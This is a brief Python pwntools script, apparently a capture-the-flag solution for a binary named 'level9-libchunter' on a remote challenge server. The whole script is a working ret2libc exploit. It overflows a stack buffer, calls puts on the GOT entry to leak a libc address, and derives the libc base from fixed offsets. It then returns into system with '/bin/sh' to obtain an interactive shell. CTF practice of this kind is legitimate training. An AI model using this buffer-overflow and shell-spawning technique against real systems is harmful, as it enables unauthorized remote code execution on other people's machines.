from pwn import *
context.log_level="debug"

r=remote("pwn.sixstars.team",22009)
#r=process("./level9-libchunter")
elf=ELF("./level9-libchunter")
#libc=ELF("/lib/i386-linux-gnu/libc.so.6")

main=0x080484E7

sh='a'*0x28+'a'*0x4+p32(elf.plt["puts"])+p32(main)+p32(elf.got["puts"])
r.recv()
r.sendline(sh)
a=u32(r.recv(4))-0x062b30
print hex(a)


system=a+0x03b340
binsh=a+0x15f803

sh='a'*0x28+'a'*0x4+p32(system)+p32(0)+p32(binsh)
r.recv()
r.sendline(sh)

r.interactive()
